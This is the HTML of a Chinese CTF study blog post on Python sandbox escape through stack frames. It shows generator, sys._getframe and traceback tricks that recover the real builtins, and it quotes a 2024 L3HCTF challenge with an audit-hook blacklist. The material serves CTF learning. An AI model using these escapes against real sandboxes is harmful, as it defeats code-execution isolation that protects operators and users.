@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="来一个开胃菜 12345678910111213141516171819def fake_int(i):    return 100001 * 100002import sys# 获取当前栈帧frame &#x3D; sys._getframe()# 安全地回溯到所需的帧（例如回溯 2 层）depth &#x3D; 2for _ in range(depth):    if frame.f_back is None:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python沙箱逃逸特辑-帧栈逃逸">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="来一个开胃菜 12345678910111213141516171819def fake_int(i):    return 100001 * 100002import sys# 获取当前栈帧frame &#x3D; sys._getframe()# 安全地回溯到所需的帧（例如回溯 2 层）depth &#x3D; 2for _ in range(depth):    if frame.f_back is None:">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-05-22T14:39:05.000Z">
+<meta property="article:modified_time" content="2025-09-12T12:31:36.065Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="学习">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>python沙箱逃逸特辑-帧栈逃逸</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/Litctf2025WP-web/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/xuanyuanCTF/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&text=python沙箱逃逸特辑-帧栈逃逸"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&title=python沙箱逃逸特辑-帧栈逃逸"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&is_video=false&description=python沙箱逃逸特辑-帧栈逃逸"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=python沙箱逃逸特辑-帧栈逃逸&body=Check out this article: https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&title=python沙箱逃逸特辑-帧栈逃逸"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&title=python沙箱逃逸特辑-帧栈逃逸"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&title=python沙箱逃逸特辑-帧栈逃逸"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&title=python沙箱逃逸特辑-帧栈逃逸"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&name=python沙箱逃逸特辑-帧栈逃逸&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&t=python沙箱逃逸特辑-帧栈逃逸"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E6%9E%9Cnext%E8%A2%AB%E7%A6%81%E6%AD%A2%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%94%A8list%EF%BC%8Csend%EF%BC%8C%E5%92%8C%E7%94%9F%E6%88%90%E5%99%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87%EF%BC%8C%E8%BF%99%E9%87%8C%E5%B0%A4%E5%85%B6%E4%BB%8B%E7%BB%8D%E7%94%9F%E6%88%90%E5%99%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%BE%97%E5%88%B0%E9%80%83%E9%80%B8%E5%87%BA%E6%9D%A5%E7%9A%84%E5%B8%A7"><span class="toc-number">1.</span> <span class="toc-text">如果next被禁止，也可以用list，send，和生成器表达式进行绕过，这里尤其介绍生成器表达式~1234a&#x3D;(a.gi_frame.f_back.f_back for i in [1])print(a)a&#x3D;[x for x in a][0]#相当于启动~print(a)这样就得到逃逸出来的帧~</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E6%89%93%E7%BB%A7%E6%89%BF%E9%93%BE"><span class="toc-number">1.0.1.</span> <span class="toc-text">直接打继承链</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        python沙箱逃逸特辑-帧栈逃逸
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-22T14:39:05.000Z" class="dt-published" itemprop="datePublished">2025-05-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/python/">python</a> › <a class="category-link" href="/categories/python/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>来一个开胃菜</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def fake_int(i):</span><br><span class="line">    return 100001 * 100002</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"># 获取当前栈帧</span><br><span class="line">frame = sys._getframe()</span><br><span class="line"></span><br><span class="line"># 安全地回溯到所需的帧（例如回溯 2 层）</span><br><span class="line">depth = 2</span><br><span class="line">for _ in range(depth):</span><br><span class="line">    if frame.f_back is None:</span><br><span class="line">        break  # 到达栈顶，停止回溯</span><br><span class="line">    frame = frame.f_back</span><br><span class="line"></span><br><span class="line"># 从安全的帧中获取全局变量</span><br><span class="line">if frame:</span><br><span class="line">    builtin = frame.f_globals[&quot;__builtins__&quot;]</span><br><span class="line">builtin.int=fake_int</span><br><span class="line">print(int(11))\#这里有一个点需要注意也许上述改变的是逃逸出的builtins里面的int，当前环境的int并未改变</span><br></pre></td></tr></table></figure></div>
+<p>sys._getframe()是获得当前的栈帧，类似于xxxx.gi_frame、xxxx._<em>traceback</em>_.tb_frame<br>成功修改了int的返回值~</p>
+<hr>
+<p>下面来自一篇博客<br><code>https://xz.aliyun.com/news/13075</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">2024L3HCTF</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;&lt;codehere&gt;&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    codes.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;__&quot;</span> <span class="keyword">in</span> codes:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;__ bypass!!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">codes+=<span class="string">&quot;\nres=factorization(c)&quot;</span></span><br><span class="line"><span class="built_in">print</span>(codes)</span><br><span class="line"><span class="built_in">locals</span>=&#123;<span class="string">&quot;c&quot;</span>:<span class="string">&quot;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&quot;</span>,<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">res=<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blackFunc</span>(<span class="params">oldexit</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">event, args</span>):</span><br><span class="line">        blackList = [<span class="string">&quot;process&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;sys&quot;</span>,<span class="string">&quot;interpreter&quot;</span>,<span class="string">&quot;cpython&quot;</span>,<span class="string">&quot;open&quot;</span>,<span class="string">&quot;compile&quot;</span>,<span class="string">&quot;__new__&quot;</span>,<span class="string">&quot;gc&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> blackList:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;noooooooooo&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                oldexit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> func</span><br><span class="line"></span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;&lt;judgecode&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">sys.addaudithook(blackFunc(os._exit))</span><br><span class="line"><span class="built_in">exec</span>(code,&#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>)</span><br><span class="line"></span><br><span class="line">p=<span class="built_in">int</span>(<span class="built_in">locals</span>[<span class="string">&quot;res&quot;</span>][<span class="number">0</span>])</span><br><span class="line">q=<span class="built_in">int</span>(<span class="built_in">locals</span>[<span class="string">&quot;res&quot;</span>][<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span>(p&gt;<span class="number">1e5</span> <span class="keyword">and</span> q&gt;<span class="number">1e5</span> <span class="keyword">and</span> p*q==<span class="built_in">int</span>(<span class="string">&quot;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&quot;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Correct!&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Wrong!&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>有关于生成器的绕过姿势~如下：<br>基本的exp类似于</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">www</span>():</span><br><span class="line">    <span class="keyword">yield</span> aaa.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">aaa=www()</span><br><span class="line">aaa=<span class="built_in">next</span>(aaa)</span><br><span class="line">aaa.f_globals[<span class="string">&quot;_\_builtins_\_&quot;</span>]\[<span class="string">&quot;_\_import__&quot;</span>\]</span><br></pre></td></tr></table></figure></div>
+<p><em>next是启动yield的结点</em><br>实例如下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">www</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> aaa.gi_frame</span><br><span class="line">    <span class="keyword">yield</span> aaa.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">aaa=www()</span><br><span class="line">aa=<span class="built_in">next</span>(aaa)</span><br><span class="line"><span class="built_in">print</span>(aa)</span><br><span class="line">a=<span class="built_in">next</span>(aaa)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b=<span class="built_in">next</span>(aaa)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line">&lt;frame at <span class="number">0x00000146BB954D60</span>, file <span class="string">&#x27;D:\\Temp\\tempCodeRunnerFile.python&#x27;</span>, line <span class="number">3</span>, code www&gt;</span><br><span class="line">&lt;frame at <span class="number">0x00000146BB955D00</span>, file <span class="string">&#x27;D:\\Temp\\tempCodeRunnerFile.python&#x27;</span>, line <span class="number">12</span>, code &lt;module&gt;&gt;</span><br></pre></td></tr></table></figure></div>
+<h2 id="如果next被禁止，也可以用list，send，和生成器表达式进行绕过，这里尤其介绍生成器表达式-这样就得到逃逸出来的帧"><a href="#如果next被禁止，也可以用list，send，和生成器表达式进行绕过，这里尤其介绍生成器表达式-这样就得到逃逸出来的帧" class="headerlink" title="如果next被禁止，也可以用list，send，和生成器表达式进行绕过，这里尤其介绍生成器表达式~这样就得到逃逸出来的帧~"></a><em>如果next被禁止，也可以用list，send，和生成器表达式进行绕过，这里尤其介绍生成器表达式~</em><br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=(a.gi_frame.f_back.f_back <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a=[x <span class="keyword">for</span> x <span class="keyword">in</span> a][<span class="number">0</span>]<span class="comment">#相当于启动~</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure></div><br>这样就得到逃逸出来的帧~</h2><p>会什么用到生成器呢，因为题目的builtins为none，什么意思呢？意味着我们无法通过一些模块或者函数获取对象引用，因此栈帧也就无从获取</p>
+<p>假使这么一道题</p>
+<p>原有的builtins极其有限，只有少数的list,len,filter等函数加上一个钩子函数加上一个<strong>Destruction</strong>函数</p>
+<p>钩子函数的绕过有两种，一种是它监测不到特定的少见的不在名单的函数和一个导入模块的操作，另一种更为灵活，修改钩子里面的len,list返回即可，永真式</p>
+<p>第一种以后有相关介绍</p>
+<p>第二种，即类似于audik_function._<em>getattribute__(‘__globals</em>_’)#主要在于通过函数得到globals</p>
+<p>拿到globals，在修改它的[‘__builtins__‘][‘len’]&#x3D;lambda x: 0或者[‘__builtins__‘][‘list’]&#x3D;lambda x:[a]</p>
+<p>由于对python这些东西认识不深，很多不过只是照虎画猫罢了</p>
+<p>而如何通过栈帧逃逸拿到真正的globals呢</p>
+<p>利用Extruction这个类</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    tb = e.__traceback__</span><br><span class="line">    frame = tb.tb_frame</span><br><span class="line">    <span class="keyword">while</span> frame.f_back:</span><br><span class="line">        frame = frame.f_back</span><br><span class="line">    <span class="built_in">globals</span> = frame.f_globals</span><br></pre></td></tr></table></figure></div>
+
+<p>拿到对象进行逃逸即可~</p>
+<h4 id="直接打继承链"><a href="#直接打继承链" class="headerlink" title="直接打继承链"></a>直接打继承链</h4><p>也有绕远路的方法，借助Exception打 本应该被AST禁止的继承链拿到绕过钩子函数检测的命令函数</p>
+<hr>
+<p>等待更新例子中…..</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E6%9E%9Cnext%E8%A2%AB%E7%A6%81%E6%AD%A2%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%94%A8list%EF%BC%8Csend%EF%BC%8C%E5%92%8C%E7%94%9F%E6%88%90%E5%99%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87%EF%BC%8C%E8%BF%99%E9%87%8C%E5%B0%A4%E5%85%B6%E4%BB%8B%E7%BB%8D%E7%94%9F%E6%88%90%E5%99%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%BE%97%E5%88%B0%E9%80%83%E9%80%B8%E5%87%BA%E6%9D%A5%E7%9A%84%E5%B8%A7"><span class="toc-number">1.</span> <span class="toc-text">如果next被禁止，也可以用list，send，和生成器表达式进行绕过，这里尤其介绍生成器表达式~1234a&#x3D;(a.gi_frame.f_back.f_back for i in [1])print(a)a&#x3D;[x for x in a][0]#相当于启动~print(a)这样就得到逃逸出来的帧~</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E6%89%93%E7%BB%A7%E6%89%BF%E9%93%BE"><span class="toc-number">1.0.1.</span> <span class="toc-text">直接打继承链</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&text=python沙箱逃逸特辑-帧栈逃逸"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&title=python沙箱逃逸特辑-帧栈逃逸"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%89%B9%E8%BE%91-%E5%B8%A7%E6%A0%88%E9%80%83%E9%80%B8/&is_video=false&description=python沙箱逃逸特辑-帧栈逃逸"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
